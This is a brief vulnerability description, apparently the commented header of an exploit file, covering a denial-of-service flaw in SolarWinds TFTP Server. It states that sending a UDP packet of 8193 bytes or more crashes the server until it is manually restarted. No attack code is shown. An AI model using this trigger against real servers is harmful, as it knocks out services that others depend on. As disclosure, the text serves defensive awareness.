#A problem in SolarWinds TFTP Server may result in a denial of service, and may have other ramifications. SolarWinds TFTP Server is distributed for the Microsoft Windows platform.
#
#Under some circumstances, it may be possible to crash a vulnerable TFTP server. By sending a UDP packet to the server that is 8193 or more bytes, the server becomes unstable. It has been reported that doing this can consistently reproduce a crash of the server, requiring a manual restart to resume normal operation.
